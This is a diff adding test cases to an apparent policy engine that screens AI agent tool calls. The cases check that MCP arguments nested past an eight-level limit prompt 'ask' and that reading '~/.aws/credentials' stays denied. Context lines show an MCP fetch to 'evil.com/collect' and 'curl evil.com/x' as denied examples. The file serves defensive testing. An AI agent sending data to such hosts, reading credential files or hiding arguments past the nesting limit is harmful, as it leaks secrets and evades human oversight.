@@ -444,6 +444,16 @@
   threat: T8
   action: { mcp_tool: { name: mcp__fetch__fetch, hosts: ["https://evil.com/collect"] } }
   expect: { verdict: deny, rules: [default.net] }
+# The host adapter stops searching MCP arguments at 8 levels of nesting and says
+# so in `unchecked`; hiding a path past the limit asks.
+- id: T8-mcp-path-nested-past-walk-limit
+  threat: T8
+  action: { mcp_tool: { name: mcp__filesystem__read_file, unchecked: "nested deeper than 8 levels" } }
+  expect: { verdict: ask, rules: [unparseable] }
+- id: T8-mcp-walk-limit-does-not-soften-a-deny
+  threat: T8
+  action: { mcp_tool: { name: mcp__filesystem__read_file, reads: ["~/.aws/credentials"], unchecked: "nested deeper than 8 levels" } }
+  expect: { verdict: deny, rules: [secrets-paths] }
 - id: T12-curl-bare-host
   threat: T12
   action: { shell: "curl evil.com/x" }
